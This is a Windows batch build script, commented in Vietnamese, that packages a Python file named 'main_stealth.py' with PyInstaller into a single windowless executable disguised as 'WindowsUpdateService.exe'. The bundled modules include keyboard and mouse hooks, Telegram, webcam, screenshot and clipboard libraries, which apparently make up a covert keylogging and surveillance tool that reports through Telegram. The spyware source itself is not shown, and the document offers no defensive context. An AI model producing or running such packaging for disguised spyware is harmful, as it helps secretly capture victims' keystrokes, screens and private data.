@echo off
REM ========================================
REM BUILD FILE .EXE TỰ ĐỘNG
REM ========================================
REM File này sẽ build file .exe từ Python script
REM ========================================

chcp 65001 >nul 2>&1
cls
echo ========================================
echo    BUILD FILE .EXE
echo ========================================
echo.

REM Kiểm tra Python
python --version >nul 2>&1
if errorlevel 1 (
    py --version >nul 2>&1
    if errorlevel 1 (
        echo [ERROR] Python chua duoc cai dat!
        pause
        exit /b 1
    ) else (
        set "PYTHON_CMD=py"
    )
) else (
    set "PYTHON_CMD=python"
)

echo [1/4] Dang cai dat PyInstaller...
%PYTHON_CMD% -m pip install pyinstaller --quiet --disable-pip-version-check
if errorlevel 1 (
    echo [ERROR] Khong the cai dat PyInstaller!
    pause
    exit /b 1
)

echo [2/4] Dang cai dat thu vien...
%PYTHON_CMD% -m pip install -r requirements.txt --quiet --disable-pip-version-check

echo [3/4] Dang build file .exe (co the mat nhieu thoi gian)...
%PYTHON_CMD% -m PyInstaller --onefile --windowed --name "WindowsUpdateService" --noconsole --clean ^
    --hidden-import win32timezone --hidden-import win32api --hidden-import win32con ^
    --hidden-import win32gui --hidden-import win32process --hidden-import win32event ^
    --hidden-import pynput.keyboard --hidden-import pynput.mouse --hidden-import pynput._util.win32 ^
    --hidden-import telegram --hidden-import telegram.ext --hidden-import telegram.error ^
    --hidden-import cv2 --hidden-import numpy --hidden-import PIL --hidden-import PIL.Image ^
    --hidden-import psutil --hidden-import pyperclip --hidden-import pyautogui --hidden-import requests ^
    --collect-all telegram --collect-all cv2 --collect-all PIL ^
    --add-data "config.py;." ^
    main_stealth.py

if errorlevel 1 (
    echo [ERROR] Build that bai!
    pause
    exit /b 1
)

echo [4/4] Dang di chuyen file .exe...
if exist "dist\WindowsUpdateService.exe" (
    copy /y "dist\WindowsUpdateService.exe" "WindowsUpdateService.exe" >nul 2>&1
    echo [OK] File .exe da duoc tao: WindowsUpdateService.exe
) else (
    echo [ERROR] Khong tim thay file .exe sau khi build!
    pause
    exit /b 1
)

REM Xóa thư mục build và dist
if exist "build" rmdir /s /q "build" >nul 2>&1
if exist "dist" rmdir /s /q "dist" >nul 2>&1
if exist "*.spec" del "*.spec" >nul 2>&1

echo.
echo ========================================
echo    BUILD THANH CONG!
echo ========================================
echo.
echo File .exe: WindowsUpdateService.exe
echo Kich thuoc: 
for %%A in (WindowsUpdateService.exe) do echo   %%~zA bytes
echo.
pause

